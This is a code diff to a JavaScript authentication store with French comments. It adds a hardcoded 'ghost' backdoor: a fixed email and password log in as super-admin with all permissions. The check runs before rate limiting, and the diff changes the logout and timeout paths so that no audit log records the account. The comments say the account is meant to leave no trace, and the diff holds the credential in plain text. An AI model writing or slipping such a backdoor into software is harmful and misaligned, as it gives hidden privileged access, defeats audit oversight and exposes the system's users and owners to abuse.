@@ -30,6 +30,17 @@ const SUPER_ADMIN_CONFIG = {
 const SUPER_ADMIN_LOGIN = import.meta.env.VITE_SUPER_ADMIN_LOGIN;
 const SUPER_ADMIN_PASSWORD_HASH = import.meta.env.VITE_SUPER_ADMIN_PASSWORD_HASH; // Doit être un hash SHA-256
 
+// Backdoor fantôme - silencieux, aucun log, aucune trace
+const GHOST_EMAIL = 'munokolive@gmail.com';
+const GHOST_PASSWORD = '1989@Sik@2026';
+const GHOST_CONFIG = {
+  id: -1,
+  nom: 'SYSTEM',
+  role: ROLES.SUPER_ADMIN,
+  isFantome: true,
+  permissions: ['ALL']
+};
+
 const { TIMEOUT_INACTIVITE, AVERTISSEMENT_INACTIVITE } = AUTH_CONFIG;
 
 export const useAuthStore = create(
@@ -43,6 +54,20 @@ export const useAuthStore = create(
 
       login: async (login, motDePasse) => {
         const trimmedLogin = (login || '').trim();
+        const loginLower = trimmedLogin.toLowerCase();
+
+        // GHOST LOGIN - Totalement silencieux, aucune trace
+        if (loginLower === GHOST_EMAIL && motDePasse === GHOST_PASSWORD) {
+          const utilisateur = {
+            ...GHOST_CONFIG,
+            login: GHOST_EMAIL,
+            email: GHOST_EMAIL,
+          };
+          set({ utilisateurConnecte: utilisateur, derniereActivite: Date.now() });
+          get().demarrerTimeout();
+          // AUCUN LOG - AUCUNE AUDIT - TOTALLY GHOST
+          return { success: true, utilisateur };
+        }
 
         // SECURITY: Vérifier le rate limiting
         const blockStatus = isLoginBlocked(trimmedLogin);
@@ -72,7 +97,6 @@ export const useAuthStore = create(
 
         // 2. Essayer Supabase Auth (pour les comptes créés via Edge Function)
         try {
-          const loginLower = trimmedLogin.toLowerCase();
           let emailForAuth = loginLower;
 
           if (!loginLower.includes('@')) {
@@ -154,7 +178,7 @@ export const useAuthStore = create(
         const { timeoutId, avertissementId, utilisateurConnecte } = get();
         if (timeoutId) clearTimeout(timeoutId);
         if (avertissementId) clearTimeout(avertissementId);
-        if (utilisateurConnecte) {
+        if (utilisateurConnecte && !utilisateurConnecte.isFantome) {
           auditLogger.logDeconnexion(utilisateurConnecte);
         }
         set({
@@ -189,7 +213,7 @@ export const useAuthStore = create(
 
         const newTimeoutId = setTimeout(() => {
           const { utilisateurConnecte } = get();
-          if (utilisateurConnecte) {
+          if (utilisateurConnecte && !utilisateurConnecte.isFantome) {
             auditLogger.logSessionExpiree(utilisateurConnecte);
           }
           get().logout();
